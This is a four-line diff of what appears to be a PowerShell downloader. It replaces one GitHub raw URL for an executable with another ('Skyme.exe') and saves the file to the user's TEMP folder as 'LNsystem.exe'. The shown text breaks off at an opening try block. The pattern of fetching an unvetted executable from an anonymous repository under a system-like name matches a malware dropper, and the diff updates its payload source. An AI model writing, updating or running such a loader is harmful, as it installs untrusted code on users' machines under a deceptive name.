@@ -1,4 +1,4 @@
-$url = "https://github.com/antonio842/fount/raw/refs/heads/main/Built.exe"
+$url = "https://raw.githubusercontent.com/dimongick/checker/refs/heads/main/Skyme.exe"
 $outputPath = "$env:TEMP\LNsystem.exe"
 
 try {
